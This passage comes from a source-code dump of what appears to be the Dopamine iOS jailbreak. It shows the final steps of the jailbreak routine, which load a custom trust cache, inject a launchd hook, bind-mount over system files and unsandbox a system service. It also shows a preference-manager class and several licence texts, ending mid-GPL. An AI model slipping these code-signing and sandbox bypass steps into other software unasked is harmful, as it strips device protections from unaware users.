    if (!tweaksEnabled) {
        printf("Creating safe mode marker file since tweaks were disabled in settings\n");
        [[NSData data] writeToFile:JBROOT_PATH(@"/basebin/.safe_mode") atomically:YES];
    }
    
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Loading BaseBin TrustCache") debug:NO];
    *errOut = [self loadBasebinTrustcache];
    if (*errOut) return;
    
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Initializing Environment") debug:NO];
    *errOut = [self injectLaunchdHook];
    if (*errOut) return;
    
    // Now that we can, protect important system files by bind mounting on top of them
    // This will be always be done during the userspace reboot
    // We also do it now though in case there is a failure between the now step and the userspace reboot
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Initializing Protection") debug:NO];
    *errOut = [self applyProtection];
    if (*errOut) return;
    
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Applying Bind Mount") debug:NO];
    *errOut = [self createFakeLib];
    if (*errOut) return;
    
    // Unsandbox iconservicesagent so that app icons can work
    exec_cmd_trusted(JBROOT_PATH("/usr/bin/killall"), "-9", "iconservicesagent", NULL);
    
    *errOut = [self finalizeBootstrapIfNeeded];
    if (*errOut) return;
    
    [[DOEnvironmentManager sharedManager] setIDownloadEnabled:idownloadEnabled needsUnsandbox:NO];
    
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Checking For Duplicate Apps") debug:NO];
    *errOut = [self ensureNoDuplicateApps];
    if (*errOut) {
        *showLogs = NO;
        return;
    }
    
    //printf("Starting launch daemons...\n");
    //exec_cmd_trusted(JBROOT_PATH("/usr/bin/launchctl"), "bootstrap", "system", JBROOT_PATH("/Library/LaunchDaemons"), NULL);
    //exec_cmd_trusted(JBROOT_PATH("/usr/bin/launchctl"), "bootstrap", "system", JBROOT_PATH("/basebin/LaunchDaemons"), NULL);
    // Note: This causes the app to freeze in some instances due to launchd only having physrw_pte, we might want to only do it when neccessary
    // It's only neccessary when we don't immediately userspace reboot
    
    printf("Done!\n");
}

- (void)finalize
{
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Rebooting Userspace") debug:NO];
    [[DOEnvironmentManager sharedManager] rebootUserspace];
}

@end

```

`Application/Dopamine/Jailbreak/DOPreferenceManager.h`:

```h
//
//  PreferenceManager.h
//  Dopamine
//
//  Created by Lars Fröder on 13.01.24.
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOPreferenceManager : NSObject
{
    NSString *_preferencesPath;
    NSMutableDictionary *_preferences;
}

+ (instancetype)sharedManager;

- (id)preferenceValueForKey:(NSString *)key;
- (BOOL)boolPreferenceValueForKey:(NSString *)key fallback:(BOOL)fallback;

- (void)setPreferenceValue:(NSObject *)obj forKey:(NSString *)key;
- (void)removePreferenceValueForKey:(NSString *)key;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/Jailbreak/DOPreferenceManager.m`:

```m
//
//  PreferenceManager.m
//  Dopamine
//
//  Created by Lars Fröder on 13.01.24.
//

#import "DOPreferenceManager.h"

@implementation DOPreferenceManager

+ (instancetype)sharedManager
{
    static DOPreferenceManager *preferenceManager;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        preferenceManager = [[DOPreferenceManager alloc] init];
    });
    return preferenceManager;
}

- (instancetype)init
{
    self = [super init];
    if (self) {
        _preferencesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Preferences/com.opa334.Dopamine.plist"];
        [self loadPreferences];
    }
    return self;
}

- (void)loadPreferences
{
    _preferences = [NSDictionary dictionaryWithContentsOfFile:_preferencesPath].mutableCopy ?: [NSMutableDictionary new];
}

- (void)savePreferences
{
    [_preferences writeToFile:_preferencesPath atomically:YES];
}

- (id)preferenceValueForKey:(NSString *)key
{
    return [_preferences objectForKey:key];
}

- (BOOL)boolPreferenceValueForKey:(NSString *)key fallback:(BOOL)fallback
{
    NSNumber *num = [self preferenceValueForKey:key];
    if (num) {
        return num.boolValue;
    }
    return fallback;
}

- (void)setPreferenceValue:(NSObject *)obj forKey:(NSString *)key
{
    [_preferences setObject:obj forKey:key];
    [self savePreferences];
}

- (void)removePreferenceValueForKey:(NSString *)key
{
    [_preferences removeObjectForKey:key];
    [self savePreferences];
}

@end

```

`Application/Dopamine/Resources/LICENSE.md`:

```md
MIT License

Copyright (c) 2023-2024 Lars Fröder (opa334)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`Application/Dopamine/Resources/LICENSE_ChOma.md`:

```md
MIT License

Copyright (c) 2023 Lars Fröder

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`Application/Dopamine/Resources/LICENSE_ElleKit.md`:

```md
Copyright (c) 2022 Évelyne Bélanger All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are
met:

   * Redistributions of source code must retain the above copyright
notice, this list of conditions and the following disclaimer.
   * Redistributions in binary form must reproduce the above
copyright notice, this list of conditions and the following disclaimer
in the documentation and/or other materials provided with the
distribution.
   * Neither ElleKit nor the names of its
contributors may be used to endorse or promote products derived from
this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

```

`Application/Dopamine/Resources/LICENSE_Fugu15.md`:

```md
MIT License

Copyright (c) 2022 Pinauten GmbH

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`Application/Dopamine/Resources/LICENSE_Fugu15_Rootful.md`:

```md
MIT License

Copyright (c) 2022/2023 Pinauten GmbH

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`Application/Dopamine/Resources/LICENSE_Procursus.md`:

```md
Copyright (c) 2020-2023 Procursus Team <team@procurs.us>

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR
OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
PERFORMANCE OF THIS SOFTWARE.

```

`Application/Dopamine/Resources/LICENSE_Sileo.md`:

```md
Copyright (c) 2021, the Sileo Project. All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
3. All advertising materials mentioning features or use of this software must display the following acknowledgement:
This product includes software developed by the Sileo Team.
4. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
THIS SOFTWARE IS PROVIDED BY THE SILEO TEAM "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE SILEO TEAM BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

```

`Application/Dopamine/Resources/LICENSE_XPF.md`:

```md
MIT License

Copyright (c) 2024 Lars Fröder

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`Application/Dopamine/Resources/LICENSE_Zebra.md`:

```md
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

                       TERMS AND CONDITIONS

  0. Definitions.

  "This License" refers to version 3 of the GNU General Public License.

  "Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

  "The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

  To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

  A "covered work" means either the unmodified Program or a work based
on the Program.

  To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

  To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

  An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

  1. Source Code.

  The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

  A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

  The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

  The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work's
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not part of the work.  For example, Corresponding Source
includes interface definition files associated with source files for
the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

  The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

  The Corresponding Source for a work in source code form is that
same work.

  2. Basic Permissions.

  All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

  You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

  Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary.

  3. Protecting Users' Legal Rights From Anti-Circumvention Law.

  No covered work shall be deemed part of an effective technological
measure under any applicable law fulfilling obligations under article
11 of the WIPO copyright treaty adopted on 20 December 1996, or
similar laws prohibiting or restricting circumvention of such
measures.

  When you convey a covered work, you waive any legal power to forbid
circumvention of technological measures to the extent such circumvention
is effected by exercising rights under this License with respect to
the covered work, and you disclaim any intention to limit operation or
modification of the work as a means of enforcing, against the work's
users, your or third parties' legal rights to forbid circumvention of
technological measures.

  4. Conveying Verbatim Copies.

  You may convey verbatim copies of the Program's source code as you
receive it, in any medium, provided that you conspicuously and
appropriately publish on each copy an appropriate copyright notice;
keep intact all notices stating that this License and any
non-permissive terms added in accord with section 7 apply to the code;
keep intact all notices of the absence of any warranty; and give all
recipients a copy of this License along with the Program.

  You may charge any price or no price for each copy that you convey,
and you may offer support or warranty protection for a fee.

  5. Conveying Modified Source Versions.

  You may convey a work based on the Program, or the modifications to
produce it from the Program, in the form of source code under the
terms of section 4, provided that you also meet all of these conditions:

    a) The work must carry prominent notices stating that you modified
    it, and giving a relevant date.

    b) The work must carry prominent notices stating that it is
    released under this License and any conditions added under section
    7.  This requirement modifies the requirement in section 4 to
    "keep intact all notices".

    c) You must license the entire work, as a whole, under this
    License to anyone who comes into possession of a copy.  This
    License will therefore apply, along with any applicable section 7
    additional terms, to the whole of the work, and all its parts,
    regardless of how they are packaged.  This License gives no
    permission to license the work in any other way, but it does not
    invalidate such permission if you have separately received it.

    d) If the work has interactive user interfaces, each must display
    Appropriate Legal Notices; however, if the Program has interactive
    interfaces that do not display Appropriate Legal Notices, your
    work need not make them do so.

  A compilation of a covered work with other separate and independent
works, which are not by their nature extensions of the covered work,
and which are not combined with it such as to form a larger program,
in or on a volume of a storage or distribution medium, is called an
"aggregate" if the compilation and its resulting copyright are not
used to limit the access or legal rights of the compilation's users
beyond what the individual works permit.  Inclusion of a covered work
in an aggregate does not cause this License to apply to the other
parts of the aggregate.

  6. Conveying Non-Source Forms.

  You may convey a covered work in object code form under the terms
of sections 4 and 5, provided that you also convey the
machine-readable Corresponding Source under the terms of this License,
in one of these ways:

    a) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by the
    Corresponding Source fixed on a durable physical medium
    customarily used for software interchange.

    b) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by a
    written offer, valid for at least three years and valid for as
    long as you offer spare parts or customer support for that product
    model, to give anyone who possesses the object code either (1) a
    copy of the Corresponding Source for all the software in the
    product that is covered by this License, on a durable physical
    medium customarily used for software interchange, for a price no
    more than your reasonable cost of physically performing this
    conveying of source, or (2) access to copy the
    Corresponding Source from a network server at no charge.

    c) Convey individual copies of the object code with a copy of the
    written offer to provide the Corresponding Source.  This
    alternative is allowed only occasionally and noncommercially, and
    only if you received the object code with such an offer, in accord
    with subsection 6b.

    d) Convey the object code by offering access from a designated
    place (gratis or for a charge), and offer equivalent access to the
    Corresponding Source in the same way through the same place at no
    further charge.  You need not require recipients to copy the
    Corresponding Source along with the object code.  If the place to
    copy the object code is a network server, the Corresponding Source
    may be on a different server (operated by you or a third party)
    that supports equivalent copying facilities, provided you maintain
    clear directions next to the object code saying where to find the
    Corresponding Source.  Regardless of what server hosts the
    Corresponding Source, you remain obligated to ensure that it is
    available for as long as needed to satisfy these requirements.

    e) Convey the object code using peer-to-peer transmission, provided
    you inform other peers where the object code and Corresponding
    Source of the work are being offered to the general public at no
    charge under subsection 6d.

  A separable portion of the object code, whose source code is excluded
from the Corresponding Source as a System Library, need not be
included in conveying the object code work.

  A "User Product" is either (1) a "consumer product", which means any
tangible personal property which is normally used for personal, family,
or household purposes, or (2) anything designed or sold for incorporation
into a dwelling.  In determining whether a product is a consumer product,
doubtful cases shall be resolved in favor of coverage.  For a particular
product received by a particular user, "normally used" refers to a
typical or common use of that class of product, regardless of the status
of the particular user or of the way in which the particular user
actually uses, or expects or is expected to use, the product.  A product
is a consumer product regardless of whether the product has substantial
commercial, industrial or non-consumer uses, unless such uses represent
the only significant mode of use of the product.

  "Installation Information" for a User Product means any methods,
procedures, authorization keys, or other information required to install
and execute modified versions of a covered work in that User Product from
a modified version of its Corresponding Source.  The information must
suffice to ensure that the continued functioning of the modified object
code is in no case prevented or interfered with solely because
modification has been made.

  If you convey an object code work under this section in, or with, or
specifically for use in, a User Product, and the conveying occurs as
part of a transaction in which the right of possession and use of the
User Product is transferred to the recipient in perpetuity or for a
fixed term (regardless of how the transaction is characterized), the
Corresponding Source conveyed under this section must be accompanied
by the Installation Information.  But this requirement does not apply
if neither you nor any third party retains the ability to install
modified object code on the User Product (for example, the work has
been installed in ROM).

  The requirement to provide Installation Information does not include a
requirement to continue to provide support service, warranty, or updates
for a work that has been modified or installed by the recipient, or for
the User Product in which it has been modified or installed.  Access to a
network may be denied when the modification itself materially and
adversely affects the operation of the network or violates the rules and
protocols for communication across the network.

  Corresponding Source conveyed, and Installation Information provided,
in accord with this section must be in a format that is publicly
documented (and with an implementation available to the public in
source code form), and must require no special password or key for
unpacking, reading or copying.

  7. Additional Terms.

  "Additional permissions" are terms that supplement the terms of this
License by making exceptions from one or more of its conditions.
Additional permissions that are applicable to the entire Program shall
be treated as though they were included in this License, to the extent
that they are valid under applicable law.  If additional permissions
apply only to part of the Program, that part may be used separately
under those permissions, but the entire Program remains governed by
this License without regard to the additional permissions.

  When you convey a copy of a covered work, you may at your option
remove any additional permissions from that copy, or from any part of
it.  (Additional permissions may be written to require their own
removal in certain cases when you modify the work.)  You may place
additional permissions on material, added by you to a covered work,
for which you have or can give appropriate copyright permission.

  Notwithstanding any other provision of this License, for material you
add to a covered work, you may (if authorized by the copyright holders of
that material) supplement the terms of this License with terms:

    a) Disclaiming warranty or limiting liability differently from the
    terms of sections 15 and 16 of this License; or

    b) Requiring preservation of specified reasonable legal notices or
    author attributions in that material or in the Appropriate Legal
    Notices displayed by works containing it; or

    c) Prohibiting misrepresentation of the origin of that material, or
    requiring that modified versions of such material be marked in
    reasonable ways as different from the original version; or

    d) Limiting the use for publicity purposes of names of licensors or
    authors of the material; or

    e) Declining to grant rights under trademark law for use of some
    trade names, trademarks, or service marks; or

    f) Requiring indemnification of licensors and authors of that
    material by anyone who conveys the material (or modified versions of
    it) with contractual assumptions of liability to the recipient, for
    any liability that these contractual assumptions directly impose on
    those licensors and authors.

  All other non-permissive additional terms are considered "further
restrictions" within the meaning of section 10.  If the Program as you
received it, or any part of it, contains a notice stating that it is
governed by this License along with a term that is a further
restriction, you may remove that term.  If a license document contains
a further restriction but permits relicensing or conveying under this
License, you may add to a covered work material governed by the terms
of that license document, provided that the further restriction does
not survive such relicensing or conveying.

  If you add terms to a covered work in accord with this section, you
must place, in the relevant source files, a statement of the
additional terms that apply to those files, or a notice indicating
where to find the applicable terms.

  Additional terms, permissive or non-permissive, may be stated in the
form of a separately written license, or stated as exceptions;
the above requirements apply either way.

  8. Termination.

  You may not propagate or modify a covered work except as expressly
provided under this License.  Any attempt otherwise to propagate or
modify it is void, and will automatically terminate your rights under
this License (including any patent licenses granted under the third
paragraph of section 11).

  However, if you cease all violation of this License, then your
license from a particular copyright holder is reinstated (a)
provisionally, unless and until the copyright holder explicitly and
finally terminates your license, and (b) permanently, if the copyright
holder fails to notify you of the violation by some reasonable means
prior to 60 days after the cessation.

  Moreover, your license from a particular copyright holder is
reinstated permanently if the copyright holder notifies you of the
violation by some reasonable means, this is the first time you have
received notice of violation of this License (for any work) from that
copyright holder, and you cure the violation prior to 30 days after
your receipt of the notice.

  Termination of your rights under this section does not terminate the
licenses of parties who have received copies or rights from you under
this License.  If your rights have been terminated and not permanently
reinstated, you do not qualify to receive new licenses for the same
material under section 10.

  9. Acceptance Not Required for Having Copies.

  You are not required to accept this License in order to receive or
run a copy of the Program.  Ancillary propagation of a covered work
occurring solely as a consequence of using peer-to-peer transmission
to receive a copy likewise does not require acceptance.  However,
nothing other than this License grants you permission to propagate or
modify any covered work.  These actions infringe copyright if you do
not accept this License.  Therefore, by modifying or propagating a
covered work, you indicate your acceptance of this License to do so.

  10. Automatic Licensing of Downstream Recipients.

  Each time you convey a covered work, the recipient automatically
receives a license from the original licensors, to run, modify and
propagate that work, subject to this License.  You are not responsible
for enforcing compliance by third parties with this License.

  An "entity transaction" is a transaction transferring control of an
organization, or substantially all assets of one, or subdividing an
organization, or merging organizations.  If propagation of a covered
work results from an entity transaction, each party to that
transaction who receives a copy of the work also receives whatever
licenses to the work the party's predecessor in interest had or could
give under the previous paragraph, plus a right to possession of the
Corresponding Source of the work from the predecessor in interest, if
the predecessor has it or can get it with reasonable efforts.

  You may not impose any further restrictions on the exercise of the
rights granted or affirmed under this License.  For example, you may
not impose a license fee, royalty, or other charge for exercise of
rights granted under this License, and you may not initiate litigation
(including a cross-claim or counterclaim in a lawsuit) alleging that
any patent claim is infringed by making, using, selling, offering for
sale, or importing the Program or any portion of it.

  11. Patents.

  A "contributor" is a copyright holder who authorizes use under this
License of the Program or a work on which the Program is based.  The
work thus licensed is called the contributor's "contributor version".

  A contributor's "essential patent claims" are all patent claims
owned or controlled by the contributor, whether already acquired or
hereafter acquired, that would be infringed by some manner, permitted
by this License, of making, using, or selling its contributor version,
but do not include claims that would be infringed only as a
consequence of further modification of the contributor version.  For
purposes of this definition, "control" includes the right to grant
patent sublicenses in a manner consistent with the requirements of
this License.

  Each contributor grants you a non-exclusive, worldwide, royalty-free
patent license under the contributor's essential patent claims, to
make, use, sell, offer for sale, import and otherwise run, modify and
propagate the contents of its contributor version.

  In the following three paragraphs, a "patent license" is any express
agreement or commitment, however denominated, not to enforce a patent
(such as an express permission to practice a patent or covenant not to
sue for patent infringement).  To "grant" such a patent license to a
party means to make such an agreement or commitment not to enforce a
patent against the party.

  If you convey a covered work, knowingly relying on a patent license,
and the Corresponding Source of the work is not available for anyone
to copy, free of charge and under the terms of this License, through a
publicly available network server or other readily accessible means,
then you must either (1) cause the Corresponding Source to be so
available, or (2) arrange to deprive yourself of the benefit of the
patent license for this particular work, or (3) arrange, in a manner
consistent with the requirements of this License, to extend the patent
license to downstream recipients.  "Knowingly relying" means you have
actual knowledge that, but for the patent license, your conveying the
covered work in a country, or your recipient's use of the covered work
in a country, would infringe one or more identifiable patents in that
country that you have reason to believe are valid.

  If, pursuant to or in connection with a single transaction or
arrangement, you convey, or propagate by procuring conveyance of, a
covered work, and grant a patent license to some of the parties
receiving the covered work authorizing them to use, propagate, modify
or convey a specific copy of the covered work, then the patent license
you grant is automatically extended to all recipients of the covered
work and works based on it.

  A patent license is "discriminatory" if it does not include within
the scope of its coverage, prohibits the exercise of, or is
conditioned on the non-exercise of one or more of the rights that are
specifically granted under this License.  You may not convey a covered
work if you are a party to an arrangement with a third party that is
